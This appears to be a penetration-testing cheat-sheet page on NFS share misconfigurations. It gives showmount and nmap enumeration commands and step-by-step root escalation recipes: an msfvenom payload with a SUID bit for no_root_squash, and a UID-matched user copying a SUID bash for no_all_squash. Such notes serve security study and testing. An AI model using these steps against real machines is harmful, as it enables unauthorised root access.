---
title: NFS Share
parent: Method (Linux)
layout: default
nav_order: 6
---

By default, access in share follows the UID and GID (except root which default root squash)

Show the mounts available: `showmount -e IP`

nmap command: `nmap –sV –script=nfs-showmount IP`

Mount: `mount -o rw,vers=2 target:share localdirectory`

`cat /etc/fstab` (to see any mount)


## no_root_squash
1. `cat /etc/fstab`
   (to see any mount)
2. Check on the victim machine for /etc/exports: `cat /etc/exports` and see if got no_root_squash
3. Confirm the share: `showmount -e IP`
4. Create a mountpoint and mount it:\
   `mkdir /tmp/nfs`\
   `mount -o rw, vers=2 IP:/sharepath /tmp/nfs`
5. On your Kali generate the payload and save it inside the share:\
   `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
6. Add executable by everyone and SUID bit so that can run as root:\
   `chmod +xs /tmp/nfs/shell.elf`
7. On the target machine execute the file to get root shell.

## no_all_squash
1. `cat /etc/fstab`
   (to see any mount)
2. Check on the victim machine for /etc/exports: `cat /etc/exports` and see if got no_all_squash (or lack of all_squash which also is equals to no_all_squash)
3. Confirm the share: `showmount -e IP`
4. Create a mountpoint and mount it:\
   `mkdir /tmp/nfs`\
   `mount -o rw, vers=2 IP:/sharepath /tmp/nfs`
5. Check `ls -la` to see what is the UID and GID of the share.
6. Add a user with same UID: `useradd username -u UID`, create a password for the user using `passwd username` to add a password and switch to the user using `su username`.
7. Copy `/bin/bash` to the share and set it with SUID bit:\
   `cp /bin/bash .`\
   `chmod 7777 bash`
8. On the target machine execute the bash file with parameter `-p` to run as that user.